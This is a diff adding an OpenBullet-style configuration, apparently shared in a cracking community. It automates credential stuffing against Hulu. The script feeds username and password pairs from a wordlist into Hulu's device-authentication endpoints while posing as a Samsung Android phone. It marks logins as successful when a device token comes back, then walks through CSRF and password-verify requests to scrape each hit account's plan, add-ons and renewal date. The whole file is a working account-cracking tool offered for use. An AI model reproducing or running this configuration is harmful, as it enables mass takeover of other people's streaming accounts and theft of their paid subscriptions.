@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "HULUUUUU",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-03T01:32:19.517734-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" 
+  CONTENT "user_email=<USER>&password=<PASS>&serial_number=9cb6d0fb39c51314&friendly_name=Android%20-%20samsung%20SM-G955N%20samsung&mobile_capabilities=telephony&additional_properties=%7B%22distro%22%3A%22google%22%2C%22device_platform%22%3A%22Android%22%2C%22device_type%22%3A%22Phone%22%2C%22app_version%22%3A%223.68.0%22%2C%22device_family%22%3A%22Android%22%2C%22build_number%22%3A%22308290%22%2C%22device_os%22%3A%22Android%20REL5.1.1%22%2C%22device_manufacturer%22%3A%22samsung%22%2C%22device_product%22%3A%22Android%20REL5.1.1%22%2C%22device_model%22%3A%22SM-G955N%22%7D&device_id=166&time_zone=America%2FBogota&screen_size=%7B%22width_pixels%22%3A1600%2C%22height_pixels%22%3A900%2C%22width_pixel_density_in_inches%22%3A320%2C%22height_pixel_density_in_inches%22%3A320%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "device_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid. Please try again" 
+
+PARSE "<SOURCE>" LR "device_token\":\"" "\"" -> VAR "TOKEN" 
+
+REQUEST POST "https://auth.hulu.com/v1/web/device_token/authenticate" 
+  CONTENT "device_token=<TOKEN>&redirect_url=https%3A%2F%2Fsecure.hulu.com%2Faccount%3Fhsrc%3Dandroid" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://auth.hulu.com/v2/web/device_token/authenticate" 
+  CONTENT "null" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: auth.hulu.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 4" 
+  HEADER "Origin: https://secure.hulu.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G955N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://secure.hulu.com/account?hsrc=android" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: _hulu_pgid=<COOKIES(_hulu_pgid)>; _fb_connected=1; _fb_id=<COOKIES(_fb_id)>; _hulu_uid=<COOKIES(_hulu_uid)>; _hulu_e_id=<COOKIES(_hulu_e_id)>; _hulu_bluekai_hashed_uid=<COOKIES(_hulu_bluekai_hashed_uid)>; _hulu_session=<COOKIES(_hulu_session)>; _hulu_assignments=<COOKIES(_hulu_assignments)>;" 
+
+REQUEST GET "https://secure.hulu.com/api/3.0/generate_csrf_value?&for_hoth=true&from_h3o=true&path=/v2/web/password/verify" 
+  
+  HEADER "Host: www.hulu.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://secure.hulu.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G955N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://secure.hulu.com/account?hsrc=android" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: _hulu_pgid=3; _fb_connected=1; _fb_id=<COOKIES(_fb_id)>; _hulu_uid=<COOKIES(_hulu_uid)>; _hulu_e_id=<COOKIES(_hulu_e_id)>; _hulu_bluekai_hashed_uid=<COOKIES(_hulu_bluekai_hashed_uid)>; _hulu_assignments=<COOKIES(_hulu_assignments)>; _hulu_session=<COOKIES(_hulu_session)>; _hulu_dt=<COOKIES(_hulu_dt)>; _h_csrf_id=<COOKIES(_h_csrf_id)>; _tcv=<COOKIES(_tcv)>;" 
+
+REQUEST POST "https://auth.hulu.com/v2/web/password/verify" 
+  CONTENT "csrf=<COOKIES(_tcv)>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.hulu.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://secure.hulu.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G955N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://secure.hulu.com/account?hsrc=android" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: _hulu_pgid=3; _fb_connected=1; _fb_id=<COOKIES(_fb_id)>; _hulu_uid=<COOKIES(_hulu_uid)>; _hulu_e_id=<COOKIES(_hulu_e_id)>; _hulu_bluekai_hashed_uid=<COOKIES(_hulu_bluekai_hashed_uid)>; _hulu_assignments=<COOKIES(_hulu_assignments)>; _hulu_session=<COOKIES(_hulu_session)>; _hulu_dt=<COOKIES(_hulu_dt)>; _h_csrf_id=<COOKIES(_h_csrf_id)>; _tcv=<COOKIES(_tcv)>;" 
+
+REQUEST GET "https://www.hulu.com/api/v1/subscription" 
+  
+  HEADER "Host: www.hulu.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://secure.hulu.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SM-G955N Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://secure.hulu.com/account?hsrc=android" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: _hulu_pgid=3; _fb_connected=1; _fb_id=<COOKIES(_fb_id)>; _hulu_uid=<COOKIES(_hulu_uid)>; _hulu_e_id=<COOKIES(_hulu_e_id)>; _hulu_bluekai_hashed_uid=<COOKIES(_hulu_bluekai_hashed_uid)>; _hulu_assignments=<COOKIES(_hulu_assignments)>; _hulu_session=<COOKIES(_hulu_session)>; _hulu_dt=<COOKIES(_hulu_dt)>; _h_csrf_id=<COOKIES(_h_csrf_id)>; _tcv=<COOKIES(_tcv)>; _p_edit_token=<COOKIES(_p_edit_token)>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Oops, something went wrong." 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Oops, something went wrong." 
+
+PARSE "<SOURCE>" LR "plan\":{\"title\":\"" "\"" CreateEmpty=FALSE -> CAP "PLAN" 
+
+PARSE "<SOURCE>" LR "\":\"Manage Plan\",\"href\":\"/account/addons" "We’ll apply your support credit to this " -> VAR "1" 
+
+PARSE "<1>" LR "\"name\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "ADDONS" 
+
+PARSE "<SOURCE>" LR "nextCharge\":{\"date\":\"" "T" CreateEmpty=FALSE -> CAP "RENEWAL" 
+
